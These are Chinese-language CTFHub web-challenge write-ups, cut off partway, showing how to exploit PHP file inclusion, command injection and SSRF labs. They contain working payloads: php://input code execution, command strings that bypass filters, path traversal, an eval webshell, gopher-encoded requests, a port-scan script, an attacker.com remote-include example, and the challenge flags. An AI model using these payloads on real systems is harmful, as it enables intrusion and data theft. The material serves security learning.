用`HackBar`构造`POST`请求访问`/?file=shell.txt`，先用`ctfhub=phpinfo();`测试一下，可以看到靶机的`PHP`相关信息。

直接用`AntSword`连接靶机，可以在`/flag`中看到`flag`。

或者用`HackBar`查找并访问`/flag`。

```bash
ctfhub=system('ls /');
```

> bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
>
> ------
>
> i have a [shell](http://challenge-9e034ed972f6158d.sandbox.ctfhub.com:10800/shell.txt), how to use it ?

```php
ctfhub=var_dump(file_get_contents('/flag'));
```

> string(33) "ctfhub{80faa4c6d73af97369e880a6} "
>
> ------
>
> i have a [shell](http://challenge-9e034ed972f6158d.sandbox.ctfhub.com:10800/shell.txt), how to use it ?

提交`ctfhub{80faa4c6d73af97369e880a6}`即可。

------

#### 解法二：`strpos`黑名单绕过法

重新审计关键代码信息。

`strpos($haystack, $needle)` 用于查找字符串 `$needle` 在另一个字符串 `$haystack` 中首次出现的位置。如果找到，返回值是第一次出现的索引位置（从0开始计算）。如果没找到，返回`false`。

```php
if (isset($_GET['file'])) {
    if (!strpos($_GET["file"], "flag")) {
        include $_GET["file"];
    } else {
        echo "Hacker!!!";
    }
}
```

攻击者可以直接请求包含名为`flag`的文件，比如`?file=flag`。 `strpos("flag", "flag")` 返回值是`0`，非零即真，`if(!0)`即`if(true)`，因此`include $_GET["file"]`成功执行。开发者本来想阻止这个操作，但由于逻辑处理考虑不周，反而允许了攻击者绕过黑名单。

此外，攻击者能尝试路径遍历等方式，只要确保 `flag` 这个词出现在路径的开头部分，就能绕过过滤。

`php`的网站目录通常在`/var/www/html/`，我们可以尝试`?file=flag/../../../../flag`，以此来访问靶机服务器系统根目录中的`flag`文件。

分析路径解析过程（当前脚本所在目录为 `/var/www/html/`）：

- 起始点：`/var/www/html/`（这是执行脚本的当前目录）
- 拼接`flag/`：`/var/www/html/flag/`（尝试进入一个名为 `flag` 的子目录）
- 第一个`../`：回溯到上一级目录`/var/www/html/`
- 第二个`../`：继续回溯到上一级目录`/var/www/`
- 第三个`../`：继续回溯到上一级目录`/var/`
- 第四个`../`：继续回溯到根目录`/`
- 最后拼接上 flag：即访问根目录中的文件`/flag`

所以，`include "flag/../../../../flag";`的执行效果为访问根目录下的`flag`文件`/flag`。

------

### php://input

`php://input`是`PHP`中的一个只读数据流，用于获取`POST`、`PUT`、`PATCH`等请求体中的原始数据，不受`php.ini`中`post_max_size`以外的表单解析配置影响（如`upload_max_filesize`、`enable_post_data_reading`）。

**`php://input`与`$_POST`的区别：**

|     特性     |              php://input              |                            $_POST                            |
| :----------: | :-----------------------------------: | :----------------------------------------------------------: |
| 数据格式支持 | 任意格式（JSON/XML/ 二进制 / 纯文本） | 仅支持`application/x-www-form-urlencoded`或`multipart/form-data` |
| 数据读取方式 |     流式读取，可按需读取部分内容      |                一次性解析为关联数组，占用内存                |
| 文件上传支持 |     不解析文件，仅读取原始字节流      |       自动解析`multipart/form-data`中的文件到`$_FILES`       |
|   内存占用   |            低（流式读取）             |                     高（全部加载到内存）                     |

**基本读取语法：**

```php
// 方式1：一次性读取全部请求体（推荐）
$rawData = file_get_contents('php://input');
 
// 方式2：流式读取（适合超大请求体）
$handle = fopen('php://input', 'r');
$rawData = '';
while (!feof($handle)) {
    $rawData .= fread($handle, 1024); // 每次读取1KB
}
fclose($handle);
```

**主要应用场景：**‌

- ‌**API 开发**‌：处理前后端分离时的 JSON 数据，避免 `$_POST` 的自动解析限制。
- ‌**文件上传**‌：接收图片、文件等二进制流数据，保存到服务器。
- ‌**RESTful 接口**‌：读取 PUT/PATCH 请求的原始数据，用于资源更新。
- ‌**大文件或流式数据处理**‌：通过流式读取（如 `fopen` 配合 `fread`）减少内存占用，避免一次性加载超大请求体。

**使用注意事项：**‌

- ‌**数据格式与编码**‌：`php://input` 返回原始二进制数据，需根据请求头（如 `Content-Type`）手动解析（如 JSON 解码），并注意字符编码（如 UTF-8）。
- ‌**请求方式限制**‌：仅适用于`POST`、`PUT`、`PATCH`等非`GET`请求，`GET`请求无请求体，读取结果为空。
- ‌**内存与性能**‌：读取超大请求体时可能触发 `memory_limit` 限制，建议使用流式读取而非 `file_get_contents()` 一次性加载。
- ‌**配置依赖**‌：请求体大小受 `php.ini` 中 `post_max_size` 限制（默认 8MB），超出时 `php://input` 读取为空，需调整配置。
- ‌**避免重复读取**‌：流只能读取一次，第二次读取返回空，需将数据保存到变量复用。
- ‌**安全性**‌：直接处理原始数据需验证和过滤输入，防止注入攻击等安全风险。
- **使用前提**：`php://input`伪协议是`PHP`中用于读取原始`POST`数据的流包装器，它不受`:ml-search-more[allow_url_fopen]{text="allow_url_fopen"}`设置的影响，但依赖于`allow_url_include`来启用从URL（包括伪协议）包含或执行代码的能力。‌

进入靶机后，直接就是`PHP`代码审计，如果`file`参数传递的字符串前六位是`php://`则文件包含`file`。

```php+HTML
<?php
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 6) === "php://" ) {
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i don't have shell, how to get flag? <br>
<a href="phpinfo.php">phpinfo</a>
i don't have shell, how to get flag?
phpinfo
```

点击`phpinfo`后，`Ctrl+F`搜索`allow_url_include`，可以看到以下信息：

|     Directive     | Local Value | Master Value |
| :---------------: | :---------: | :----------: |
|  allow_url_fopen  |     On      |      On      |
| allow_url_include |     On      |      On      |

用`HackBar`构造`POST`请求访问`/?file=php://input`，传递数据`<?php system("ls /"); ?>`没反应。

因为`file`参数需要通过`GET`请求传递，而`php://input`仅适用于`POST`、`PUT`、`PATCH`等非`GET`请求。

用`Burp Suite`抓包，先利用`GET`请求传参，构造`php://input`伪协议，再夹带`POST`请求体数据。

```
GET /?file=php://input HTTP/1.1
Host: challenge-814628a6e9c7e0da.sandbox.ctfhub.com:10800
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive

<?php system("ls /"); ?>
```

右键`Send to Repeater`，再将`Intercept`放行，靶机显示的信息如下：

> bin boot dev etc flag_21958 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var

在`Repeater`中，添加`<?php system("cat /flag_21958"); ?>`后发送请求。

```
GET /?file=php://input HTTP/1.1
Host: challenge-814628a6e9c7e0da.sandbox.ctfhub.com:10800
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive
Content-Length: 35

<?php system("cat /flag_21958"); ?>
```

可以在`Response`中看到信息如下：

> ctfhub{781b76a00bff98d4ecd37e4f}
> <hr>
> i don't have shell, how to get flag? <br>
> <a href="phpinfo.php">phpinfo</a>

提交`ctfhub{781b76a00bff98d4ecd37e4f}`即可。

------

### 远程包含

远程文件包含（RFI）是一种安全漏洞，当Web应用程序使用用户控制的输入作为文件路径参数，并通过PHP函数（如 `include`、`require`）从远程服务器加载和执行文件时可能发生。‌

RFI漏洞的核心在于程序未对用户输入进行严格过滤，允许攻击者指定远程文件的URI（如 `http://` 或 `ftp://`），从而引入并执行恶意代码。‌‌成功利用RFI通常需要满足以下条件：

- PHP配置中 `:ml-search-more[allow_url_fopen]{text="allow_url_fopen"}` 设置为 `On`（默认开启）。
- `:ml-search-more[allow_url_include]{text="allow_url_include"}` 设置为 `On`（默认关闭，需手动启用）。
- 目标服务器能够访问远程URL，且远程文件的文件类型与服务器解析环境兼容（例如，若目标服务器解析PHP，远程文件通常不应为PHP格式）。‌

远程文件包含（RFI）与本地文件包含（LFI）的区别：RFI和LFI的原理相似，均源于未过滤的用户输入，但攻击载体不同：LFI仅限于包含本地服务器上的文件（如 `../etc/passwd`），而RFI允许包含远程服务器上的文件（如 `http://attacker.com/malicious.php`）。 因此，RFI的威胁通常更高，因为它可能直接执行远程代码。

防止RFI漏洞需采取以下措施：

- 禁用 `allow_url_fopen` 和 `allow_url_include` 配置选项。
- 对文件包含函数的参数实施严格的白名单验证，避免直接使用用户输入。
- 使用静态文件路径或安全函数（如 `:ml-search-more[basename()]{text="basename()"}`）过滤输入。‌

回到题目，进入靶机后就是`PHP`代码审计。

```php+HTML
<?php
error_reporting(0);
if (isset($_GET['file'])) {
    if (!strpos($_GET["file"], "flag")) {
        include $_GET["file"];
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i don't have shell, how to get flag?<br>
<a href="phpinfo.php">phpinfo</a>
```

又是这个`strpos($_GET["file"], "flag")`，在前面的文件包含题中，我已经写道了可以利用`strpos`来绕过黑名单，攻击`payload`为`?file=flag/../../../../flag`，直接可以拿到`flag`。

此外，我们可以继续使用`php://input`伪协议，做法跟前面的`php://input`题一样。

点击`phpinfo`后，`Ctrl+F`搜索`allow_url_include`，可以看到以下信息：

|     Directive     | Local Value | Master Value |
| :---------------: | :---------: | :----------: |
|  allow_url_fopen  |     On      |      On      |
| allow_url_include |     On      |      On      |

因为`file`参数需要通过`GET`请求传递，而`php://input`仅适用于`POST`、`PUT`、`PATCH`等非`GET`请求。

用`Burp Suite`抓包，先利用`GET`传参，请求`?file=php://input`，再夹带`POST`请求体数据。

```
GET /?file=php://input HTTP/1.1
Host: challenge-b83b77499cce90b5.sandbox.ctfhub.com:10800
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive

<?php system("cat /flag"); ?>
```

直接在`Intercept`中抓包修改放行，可以在靶机看到以下信息：

> ctfhub{85116e06acba01f64cdce3cd}
>
> ------
>
> i don't have shell, how to get flag?
> [phpinfo](http://challenge-b83b77499cce90b5.sandbox.ctfhub.com:10800/phpinfo.php)

提交`ctfhub{85116e06acba01f64cdce3cd}`即可。

------

### 读取源代码

在这儿写点笔记总结一下常见的`php`伪协议吧。

#### 常见的`php`伪协议

|      php伪协议      |        `allow_url_fopen`        |       `allow_url_include`       |
| :-----------------: | :-----------------------------: | :-----------------------------: |
|      `file://`      |             off/on              |             off/on              |
|   `php://filter`    |             off/on              |             off/on              |
|    `php://input`    |             off/on              | <font color="#ff0000">on</font> |
|      `data://`      | <font color="#ff0000">on</font> | <font color="#ff0000">on</font> |
|      `zip://`       |             off/on              |             off/on              |
| `compress.bzip2://` |             off/on              |             off/on              |
| `compress.zlib://`  |             off/on              |             off/on              |

`file://`能访问本地文件系统，通常用于读取本地文件，用法为`file://[文件的绝对路径和文件名]`，其不受`allow_url_fopen`与`allow_url_include`的影响。比如：

```
?file=file://D:/soft/phpStudy/WWW/readme.txt
```

`php://`伪协议用于访问各个输入/输出流，在CTF中经常使用的是`php://filter`和`php://input`。通常，`php://filter/read`用于读取源码，`php://input`用于执行`php`代码。

`php://filter`可以读取源代码并显示`base64`编码后的字符串，可选参数有`read`和`write`，必选参数为`resource`，`resource`用于指定要筛选过滤的数据流。比如：

```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

`php://input`是`PHP`中的一个只读数据流，用于获取`POST`、`PUT`、`PATCH`等请求体中的原始数据。

`php://input`只有在开启`allow_url_include`时才能使用。使用方法比如：

```
http://127.0.0.1/cmd.php?file=php://input

[POST DATA] <?php system("cat /flag"); ?>
```

`data://`协议的使用前提是需要同时开启`allow_url_fopen`和`allow_url_include`。

```
?file=data://text/plain,<?php phpinfo();?>
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

`zip://`, `bzip2://`, `zlib://`均属于压缩流，可以访问压缩文件中的子文件，而且无需指定后缀名。

```
?file=zip://文件路径
?file=compress.bzip2://文件路径
?file=compress.zlib://文件路径
```

------

#### php://filter/read

回到这道题——读取源代码。

进入靶机后，直接就是`PHP`代码审计，如果`file`参数传递的字符串前六位是`php://`则文件包含`file`。通常，`php://filter/read`用于读取源码，`php://input`用于执行`php`代码。

```php+HTML
<?php
error_reporting(E_ALL);
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 6) === "php://" ) {
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i don't have shell, how to get flag? <br>
flag in <code>/flag</code>
```

我们可以使用`?file=php://filter/read=convert.base64-encode/resource=/flag`来获取`base64`编码后的`flag`内容。发送`GET`请求后，靶机显示的信息如下：

> Y3RmaHVie2IzNWU2NmI0NTBhMWE0ZGU0ZTRkMzM2NX0K
>
> ------
>
> i don't have shell, how to get flag?
> flag in `/flag`

直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到源码信息。

```bash
C:\Users\tyd>php -r "var_dump(base64_decode('Y3RmaHVie2IzNWU2NmI0NTBhMWE0ZGU0ZTRkMzM2NX0K'));"
string(33) "ctfhub{b35e66b450a1a4de4e4d3365}
"
```

提交`ctfhub{b35e66b450a1a4de4e4d3365}`即可。

------

### 命令注入

**常见的拼接符**

```python
A ; B     # 先执行A再执行B
A & B     # 简单的拼接
A | B     # 只显示B的执行结果
A && B    # A执行成功后才会执行B
A || B    # A执行失败后才会执行B
${IFS}    # 在特殊情况下可代替空格
$*        # 在shell中可执行为空
%0a       # 换行符
%0d       # 回车符
```

题目描述如下：

> 这是一个在线测试网络延迟的平台，路由器中经常会见到。无任何安全措施，尝试获取 flag

这是一个无过滤的命令注入题。`PHP`的关键代码如下：

```php
<?php
$res = FALSE;
if (isset($_GET['ip']) && $_GET['ip']) {
    $cmd = "ping -c 4 {$_GET['ip']}";
    exec($cmd, $res);
}
?>
```

我们输入`127.0.0.1 | ls`或`; ls`，相当于执行`ping -c 4 127.0.0.1 | ls`或`ping -c 4 ; ls`，后者会报错`ping: missing host operand`但shell仍会继续执行 `ls`。我们可以看到以下回显内容：

```php
Array
(
    [0] => 4527152612357.php
    [1] => index.php
)
```

直接`127.0.0.1 | cat 4527152612357.php`，右键查看网页源码可以看到回显内容：

```php
Array
(
    [0] => <?php // ctfhub{a0a9dc69f8f3b21cc6a06754}
)
```

提交`flag`即可。

------

### 过滤cat

> 过滤了cat命令之后，你还有什么方法能读到 Flag?

靶机给出的`PHP`代码如下：

```php
<?php
$res = FALSE;
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/cat/", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>
```

我们可以看到`cat`命令被过滤啦，只能用类似它的命令输出内容啦。比如`tail`、`head`、`less`、`more`。

输入`127.0.0.1 | ls`可以看到以下回显内容：

```php
Array
(
    [0] => flag_28972198054974.php
    [1] => index.php
)
```

输入`127.0.0.1 | tail flag_28972198054974.php`，右键查看网页源码可以看到`flag`。

```php
Array
(
    [0] => <?php // ctfhub{37a5bd98095932d0e71c208d}
)
```

提交`flag`即可。

------

### 过滤空格

> 这次过滤了空格，你能绕过吗

靶机给出的`PHP`代码如下：

```php
<?php
$res = FALSE;
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/ /", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>
```

空格被过滤掉啦。在Shell（尤其是Bash）中，我们通常可以使用`${IFS}`代替空格。

输入`;${IFS}ls`，可以看到回显内容如下：

```php
Array
(
    [0] => flag_13475112644701.php
    [1] => index.php
)
```

输入`;cat${IFS}flag_13475112644701.php`，右键查看网页源码可以看到以下内容：

```php
Array
(
    [0] => <?php // ctfhub{443b0571edd4f358f0273e3e}
)
```

提交`flag`即可。

------

### 过滤目录分隔符

> 这次过滤了目录分割符 / ，你能读到 flag 目录下的 flag 文件吗

靶机给出的`PHP`代码如下：

```php
<?php
$res = FALSE;
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/\//", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>
```

输入`; ls`，可以看到以下回显内容：

```php
Array
(
    [0] => flag_is_here
    [1] => index.php
)
```

输入`; cd flag_is_here; ls`，可以看到以下回显内容：

```php
Array
(
    [0] => flag_91642870531208.php
)
```

输入`; cd flag_is_here; cat flag_91642870531208.php`，右键查看网页源码能看到以下内容：

```php
Array
(
    [0] => <?php // ctfhub{927787c835e0ee9b0908bada}
)
```

提交`flag`即可。

------

### 过滤运算符

> 过滤了几个运算符, 要怎么绕过呢

靶机给出的`PHP`代码如下：

```php
<?php
$res = FALSE;
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/(\||\&)/", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>
```

这道题明确过滤了任何包含 `|` 或 `&` 的输入（包括 `||`、`&&`、`|`、`&`），我们仍可以想办法绕过。

输入`; ls`，可以看到以下回显内容：

```php
Array
(
    [0] => flag_17418260026643.php
    [1] => index.php
)
```

输入`; cat flag_17418260026643.php`，右键查看网页源码可以看到以下内容：

```php
Array
(
    [0] => <?php // ctfhub{231a3344ae126d0c8c9312f1}
)
```

提交`flag`即可。

------

### 综合过滤练习

> 同时过滤了前面几个小节的内容, 如何打出漂亮的组合拳呢?

靶机给出的`PHP`代码如下：

```php
<?php
$res = FALSE;
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>
```

这意味着只要输入中包含以下**任意一个**内容，就会被拦截：`|`，`&`，`;`，空格，`/`，字符串 `cat`，字符串 `flag`，字符串 `ctfhub`。我们需要想办法绕过去。

`%0a`相当于换行符，`%0d`相当于回车，`${IFS}`可代替空格，`$*`可表示为空。

为了避免被再次`URL`解析，我们可以直接构造`GET`请求`/?ip=127.0.0.1%0als`。

```php
Array
(
    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
    [1] => 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.030 ms
    [2] => 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.041 ms
    [3] => 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.052 ms
    [4] => 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.042 ms
    [5] => 
    [6] => --- 127.0.0.1 ping statistics ---
    [7] => 4 packets transmitted, 4 packets received, 0% packet loss
    [8] => round-trip min/avg/max = 0.030/0.041/0.052 ms
    [9] => flag_is_here
    [10] => index.php
)
```

由于`flag`字符串被过滤了，所以需要用`/?ip=127.0.0.1%0acd${IFS}fl$*ag_is_here%0als`绕过去。

```php
Array
(
    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
    [1] => 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.032 ms
    [2] => 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.051 ms
    [3] => 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.041 ms
    [4] => 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.044 ms
    [5] => 
    [6] => --- 127.0.0.1 ping statistics ---
    [7] => 4 packets transmitted, 4 packets received, 0% packet loss
    [8] => round-trip min/avg/max = 0.032/0.042/0.051 ms
    [9] => flag_281721768515479.php
)
```

`cat`字符串也被过滤了，但我们可以用`tail`、`head`、`less`、`more`等方式读取`flag`文件中的内容。

构造`/?ip=127.0.0.1%0acd${IFS}fl$*ag_is_here%0ahead${IFS}f$*lag_281721768515479.php`，右键查看网页源码，可以看到内容如下：

```php
Array
(
    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
    [1] => 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.029 ms
    [2] => 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.044 ms
    [3] => 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.055 ms
    [4] => 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.037 ms
    [5] => 
    [6] => --- 127.0.0.1 ping statistics ---
    [7] => 4 packets transmitted, 4 packets received, 0% packet loss
    [8] => round-trip min/avg/max = 0.029/0.041/0.055 ms
    [9] => <?php // ctfhub{3e78b7fc46b5185e46457467}
)
```

提交`flag`即可。

------

## SSRF

SSRF（Server-Side Request Forgery：服务器端请求伪造）是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）

SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器

简单理解就是可以从某些地方让目标服务器发起请求（url参数上较为常见），我们利用目标服务器的请求权限来请求内网内容来达到攻击的目的。

### 内网访问

> 尝试访问位于127.0.0.1的flag.php吧

进入靶机后，根据提示访问127.0.0.1的flag.php，直接构造`GET`请求`/?url=127.0.0.1/flag.php`。

或者`/?url=http://127.0.0.1/flag.php`也可以看到`ctfhub{6ddbe77332c12fc373efbb47}`。

------

### 伪协议读取文件

> 尝试去读取一下Web目录下的flag.php吧

常见的Web目录为`/var/www/html/`。前面已经介绍过常见的`php`伪协议，这里我们可以用`file://`。

构造`GET`请求`/?url=file:///var/www/html/flag.php`，直接看到？？？，右键查看网页源码内容。

```php+HTML
<?php
// Flag is ctfhub{35f22234ba8ccb16a4ef763e}
?>

???
```

提交`flag`即可。

------

### 端口扫描

> 来来来性感CTFHub在线扫端口，据说端口范围是8000-9000哦。

首先用`Burp Suite`抓包靶机，然后右键`Send to Intruder`。

```
GET /?url=127.0.0.1:8000 HTTP/1.1
Host: challenge-d11d59bf5b106116.sandbox.ctfhub.com:10800
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive
```

Target是`http://challenge-d11d59bf5b106116.sandbox.ctfhub.com:10800`。

Positions选中8000后点击Add。

Payloads中的设置是：`Payload type`为`Number`，Number range中的From是`8000`，To是`9000`，Step是`1`。

设置好后点击Start attack，端口扫描完成后可以在结果中看到大多数的请求长度为332，找到一个例外的长度是365，端口号为8480。点击后可以看到`flag`字符串`ctfhub{f25596e0f74ea29fb8b66f1b}`。

此外，我们也可以编写`Python`代码遍历8000-9000来扫描端口。

```python
import requests

base_url = "http://challenge-d11d59bf5b106116.sandbox.ctfhub.com:10800/?url=127.0.0.1:"

for port in range(8000, 9001):
    url = f"{base_url}{port}"
    try:
        response = requests.get(url, timeout=2)
        # print(f"Port {port}: Status Code {response.status_code}")
        content_length = len(response.content)
        if content_length > 0:
            print(f"Port {port}: Status Code {response.status_code}")
            print(f"Response Length: {content_length} bytes")
            print(response.content.decode('utf-8'))
    except requests.exceptions.RequestException as e:
        print(f"Port {port}: Error - {e}")
```

运行代码后可以看到以下内容：

```
Port 8480: Status Code 200
Response Length: 32 bytes
ctfhub{f25596e0f74ea29fb8b66f1b}
```

提交`flag`即可。

------

### POST请求

> 这次是发一个HTTP POST请求。对了，ssrf是用php的curl实现的，并且会跟踪302跳转。加油吧骚年。

先构造`GET`请求`/?url=127.0.0.1/flag.php`，右键查看源码可以看到有个`key`

```html
<form action="/flag.php" method="post">
<input type="text" name="key">
<!-- Debug: key=8679c8e8ff37c9b40223423abaca119e-->
</form>
```

这道题需要用到gopher协议。gopher协议支持发出GET、POST请求：可以先拦截GET请求包和POST请求包，再构造成符合gopher协议的请求。gopher协议是SSRF利用中最强大的协议（俗称万能协议）。其格式为`gopher://IP:port/_{TCP/IP数据流}`。

由于`curl`支持`gopher协议`，所以这里是利用`curl`进行进行post请求，完成内网攻击。

在gopher协议中发送HTTP的数据，需要以下三步：

1、构造HTTP数据包
2、URL编码、替换回车换行为`%0D%0A`
3、发送gopher协议

用`Burp Suite`抓包后保留关键信息：

```
POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
key=8679c8e8ff37c9b40223423abaca119e
```

用python对以上信息进行`URL`编码。

```python
from urllib.parse import quote

s = """POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
key=8679c8e8ff37c9b40223423abaca119e"""

encode_s = quote(s)
print(encode_s)
```

把第一次编码中所有的%0A都替换成%0D%0A，并且末尾加上%0D%0A，然后进行二次编码。

需要两次URL编码是因为在浏览器的地址栏进行get传参时，浏览器会自动进行一次`UrlDecode()`的解码。但是这里`curl`就需要`url`编码的东西，所以需要编两次。

```
POST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2036%0D%0Akey%3D8679c8e8ff37c9b40223423abaca119e
```

第二次编码的结果为：

```
POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250Akey%253D8679c8e8ff37c9b40223423abaca119e%250D%250A
```

我们再加上`gopher://127.0.0.1:80/_`，用`HackBar`发送`POST`请求。

http://challenge-5a7003beb7bd8424.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250d%250AHost:127.0.0.1%250d%250AContent-Type:application/x-www-form-urlencoded%250d%250AContent-Length:36%250d%250A%250d%250Akey=8679c8e8ff37c9b40223423abaca119e%250d%250a

靶机显示的信息如下：

```
HTTP/1.1 200 OK Date: Thu, 08 Jan 2026 06:20:29 GMT Server: Apache/2.4.25 (Debian) X-Powered-By: PHP/5.6.40 Content-Length: 32 Content-Type: text/html; charset=UTF-8 ctfhub{556239a9d8c62561709ffc84}
```

提交`flag`即可。

------

### 上传文件

> 这次需要上传一个文件到flag.php了，祝你好运。

访问靶机的`/?url=127.0.0.1/flag.php`，很明显少了个提交按钮，右键查看网页源码如下：

```html
Upload Webshell

<form action="/flag.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
</form>
```

在HTML中如果button在form标签中则默认是提交按钮，不用改变修改type属性。直接`F12`加个按钮。

```html
<form action="/flag.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <button>提交</button>
</form>
```

编写`PHP`一句话木马

```php
<?php @eval($_POST['t0ur1st']); ?>
```

上传文件后出现：

> Just View From 127.0.0.1

用`Burp Suite`抓包上传文件时的`POST`数据。

```
POST /flag.php HTTP/1.1
Host: challenge-7f65b529cb061b36.sandbox.ctfhub.com:10800
Content-Length: 227
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Origin: http://challenge-7f65b529cb061b36.sandbox.ctfhub.com:10800
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCwDRYcG3y5cgtLpG
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-7f65b529cb061b36.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive

------WebKitFormBoundaryCwDRYcG3y5cgtLpG
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: application/octet-stream

<?php @eval($_POST['t0ur1st']); ?>
------WebKitFormBoundaryCwDRYcG3y5cgtLpG--
```

编写`Python`代码进行`URL`编码：

```python
from urllib.parse import quote

s = """POST /flag.php HTTP/1.1
Host: challenge-7f65b529cb061b36.sandbox.ctfhub.com:10800
Content-Length: 227
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Origin: http://challenge-7f65b529cb061b36.sandbox.ctfhub.com:10800
